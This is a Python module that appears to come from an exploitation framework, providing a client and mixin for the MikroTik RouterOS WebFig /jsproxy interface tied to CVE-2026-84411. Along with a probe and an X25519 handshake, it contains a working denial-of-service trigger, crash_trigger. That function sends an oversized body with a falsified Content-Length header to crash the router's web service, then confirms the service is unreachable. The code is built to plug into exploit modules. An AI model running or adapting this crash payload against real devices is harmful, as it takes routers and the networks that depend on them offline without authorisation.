#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic MikroTik RouterOS WebFig /jsproxy client and module mixin (CVE-2026-84411 family)."""

from __future__ import annotations

import socket
import struct
from typing import Optional, Tuple

from core.framework.base_module import BaseModule
from core.framework.option import OptFloat, OptPort

try:
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey

    _HAS_X25519 = True
except ImportError:
    _HAS_X25519 = False


class RouterOSWebFigClient:
    """Low-level RouterOS WebFig jsproxy transport (raw TCP HTTP)."""

    JSPROXY_PATH = "/jsproxy"
    DEFAULT_PORT = 80
    MIN_CRASH_BODY = 640

    def __init__(self, host: str, port: int = DEFAULT_PORT, *, timeout: float = 8.0) -> None:
        self.host = self.normalize_host(host)
        self.port = int(port or self.DEFAULT_PORT)
        self.timeout = max(1.0, float(timeout or 8.0))

    @staticmethod
    def normalize_host(host: str) -> str:
        return str(host or "").strip().split("%")[0].split(":")[0]

    @staticmethod
    def http_status(data: bytes) -> int:
        if not data:
            return 0
        try:
            line = data.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
            parts = line.split()
            return int(parts[1]) if len(parts) >= 2 else 0
        except (ValueError, IndexError):
            return 0

    def recv_http(self, sock: socket.socket, timeout: Optional[float] = None) -> bytes:
        sock.settimeout(timeout if timeout is not None else self.timeout)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    hdr_end = data.index(b"\r\n\r\n") + 4
                    cl = 0
                    for line in data[:hdr_end].decode("latin-1", errors="replace").split("\r\n"):
                        if line.lower().startswith("content-length:"):
                            cl = int(line.split(":", 1)[1].strip())
                    if len(data) - hdr_end >= cl:
                        break
        except socket.timeout:
            pass
        return data

    def send_jsproxy_raw(
        self,
        sock: socket.socket,
        body: bytes,
        *,
        cl_override: Optional[int] = None,
    ) -> None:
        cl = cl_override if cl_override is not None else len(body)
        req = (
            f"POST {self.JSPROXY_PATH} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: msg\r\n"
            f"Content-Length: {cl}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("latin-1") + body
        sock.sendall(req)

    def connect(self, timeout: Optional[float] = None) -> socket.socket:
        return socket.create_connection((self.host, self.port), timeout=timeout or self.timeout)

    def probe(self) -> Tuple[bool, str]:
        """Safe probe: GET /jsproxy then POST with Content-Type: msg."""
        try:
            sock = self.connect()
        except OSError as exc:
            return False, f"connect failed: {exc}"
        try:
            sock.sendall(
                (
                    f"GET {self.JSPROXY_PATH} HTTP/1.1\r\n"
                    f"Host: {self.host}:{self.port}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode("latin-1")
            )
            resp = self.recv_http(sock)
            status = self.http_status(resp)
            if status not in (200, 400, 401, 403, 404, 405):
                return False, f"GET {self.JSPROXY_PATH} unexpected HTTP {status or 'no response'}"
        finally:
            sock.close()

        try:
            sock = self.connect()
        except OSError as exc:
            return False, f"connect failed on POST probe: {exc}"
        try:
            self.send_jsproxy_raw(sock, b"")
            resp = self.recv_http(sock, timeout=min(self.timeout, 3.0))
            if not resp:
                return False, f"POST {self.JSPROXY_PATH} (msg) — no response"
            return True, f"jsproxy surface responds (HTTP {self.http_status(resp)})"
        except socket.timeout:
            return True, "jsproxy POST hung (msg channel) — likely RouterOS WebFig"
        finally:
            sock.close()

    def handshake(self) -> Tuple[bool, str]:
        if not _HAS_X25519:
            return False, "cryptography package required for X25519 jsproxy handshake"
        try:
            sock = self.connect()
        except OSError as exc:
            return False, str(exc)
        try:
            priv = X25519PrivateKey.generate()
            pubkey_be = priv.public_key().public_bytes_raw()[::-1]
            handshake = struct.pack(">II", 0, 0) + pubkey_be
            self.send_jsproxy_raw(sock, handshake)
            data = self.recv_http(sock)
            body = data.split(b"\r\n\r\n", 1)[-1] if data else b""
            if len(body) >= 40:
                return True, "X25519 jsproxy handshake completed"
            return False, f"short jsproxy handshake body ({len(body)} bytes)"
        except Exception as exc:
            return False, str(exc)
        finally:
            sock.close()

    def crash_trigger(
        self,
        body_len: int = 2048,
        *,
        declared_cl: int = 32,
    ) -> Tuple[bool, str]:
        """Destructive DoS trigger from public CVE-2026-84411 research."""
        body = b"A" * max(int(body_len), self.MIN_CRASH_BODY)
        try:
            sock = self.connect(timeout=10.0)
        except OSError as exc:
            return False, str(exc)
        try:
            self.send_jsproxy_raw(sock, body, cl_override=declared_cl)
            self.recv_http(sock, timeout=3.0)
        except Exception:
            pass
        finally:
            sock.close()
        try:
            sock = self.connect(timeout=4.0)
            sock.sendall(
                (
                    f"GET / HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: close\r\n\r\n"
                ).encode("latin-1")
            )
            self.recv_http(sock, timeout=2.0)
            sock.close()
            return False, "WebFig still answering after crash payload (may be patched)"
        except OSError:
            return True, "WebFig unreachable after crash trigger — www likely dead (CVE-2026-84411)"


class RouterOSWebFig(BaseModule):
    """
    RouterOS WebFig jsproxy mixin for scanners and exploits.

    Example::

        class Module(Exploit, RouterOSWebFig):
            def run(self):
                ok, reason = self.routeros_jsproxy_probe()
    """

    webfig_port = OptPort(80, "RouterOS WebFig HTTP port", required=False)
    jsproxy_timeout = OptFloat(8.0, "WebFig/jsproxy socket timeout (seconds)", required=False, advanced=True)

    def _jsproxy_timeout(self) -> float:
        raw = getattr(self, "jsproxy_timeout", None)
        if hasattr(raw, "value"):
            raw = raw.value
        return float(raw or 8.0)

    def routeros_webfig_host(self) -> str:
        for attr in ("target", "rhost"):
            value = str(getattr(self, attr, "") or "").strip()
            if value:
                return RouterOSWebFigClient.normalize_host(value)
        return ""

    def routeros_webfig_port(self) -> int:
        port = getattr(self, "webfig_port", None)
        if hasattr(port, "value"):
            port = port.value
        return int(port or RouterOSWebFigClient.DEFAULT_PORT)

    def routeros_webfig_client(self, host: Optional[str] = None, port: Optional[int] = None) -> RouterOSWebFigClient:
        h = RouterOSWebFigClient.normalize_host(host or self.routeros_webfig_host())
        p = int(port if port is not None else self.routeros_webfig_port())
        return RouterOSWebFigClient(h, p, timeout=self._jsproxy_timeout())

    def routeros_jsproxy_probe(self, host: Optional[str] = None, port: Optional[int] = None) -> Tuple[bool, str]:
        return self.routeros_webfig_client(host, port).probe()

    def routeros_jsproxy_handshake(self, host: Optional[str] = None, port: Optional[int] = None) -> Tuple[bool, str]:
        return self.routeros_webfig_client(host, port).handshake()

    def routeros_jsproxy_crash(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        *,
        body_len: int = 2048,
        declared_cl: int = 32,
    ) -> Tuple[bool, str]:
        return self.routeros_webfig_client(host, port).crash_trigger(body_len, declared_cl=declared_cl)
